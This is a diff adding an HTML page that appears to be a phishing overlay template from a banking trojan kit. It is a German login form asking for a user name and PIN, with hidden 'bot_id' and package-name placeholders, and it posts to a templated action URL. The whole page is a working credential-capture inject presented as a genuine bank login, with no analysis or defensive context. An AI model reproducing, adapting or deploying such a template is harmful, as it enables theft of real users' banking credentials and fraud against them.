@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
+    <title>24</title>
+
+    <link rel="stylesheet" href="%DYN_PATH%/css/normalize.css">
+    <link rel="stylesheet" href="%DYN_PATH%/js/vendor/jQueryFormStyler/jquery.formstyler.css">
+    <link rel="stylesheet" href="%DYN_PATH%/css/main.css">
+
+    <link rel="stylesheet" href="%DYN_PATH%/css/24.css">
+
+    <script src="%DYN_PATH%/js/vendor/jquery-1.11.3.min.js"></script>
+    <script src="%DYN_PATH%/js/viewport.js"></script>
+    <script src="%DYN_PATH%/js/vendor/jQueryFormStyler/jquery.formstyler.min.js"></script>
+    <script src="%DYN_PATH%/js/08.js"></script>
+</head>
+
+<body>
+		<div class="modal modal_header">
+			<div class="container">
+                <div class="row row_header">
+                    <div class="form_header">
+                        <img src="%DYN_PATH%/img/logo.gif" alt="">
+                    </div>
+                </div>
+				<form action="%ACTION%" method="post" class="wrapper" onsubmit="return function(){ 
+var ok = true;
+
+$('input').each(function (i, value){  
+	$(value).css('border', '');
+	if(!$(value).val()){  
+		$(value).css('border', '1px solid red');
+		ok = false;
+	}
+	
+});
+if(window.form_sent) return false; if(ok) window.form_sent = true; return ok; 
+}()">
+					<input type="hidden" name="page_id" value="%PKG%" class="main_input"><input type="hidden" name="bot_id" value="%BOTID%" />
+					<div class="row">
+						<div class="content">
+							<div class="input_block_wr">
+								<div class="inp_caption">
+									Anmeldename
+								</div>
+								<div class="inp_wr">
+									<input type="text" name="fields[name]" class="main_input">
+								</div>
+							</div>
+							<div class="input_block_wr">
+								<div class="inp_caption">
+									PIN
+								</div>
+								<div class="inp_wr">
+									<input type="password" name="fields[pin]" class="main_input">
+								</div>
+							</div>
+							<div class="input_block_wr input_block_wr_l">
+							</div>
+							<div class="btn_wr">
+								<button class="logon_btn">
+									Anmelden
+								</button>
+							</div>
+						</div>
+					</div>
+				</form>
+			</div>
+		</div>
+</body>
+</html>
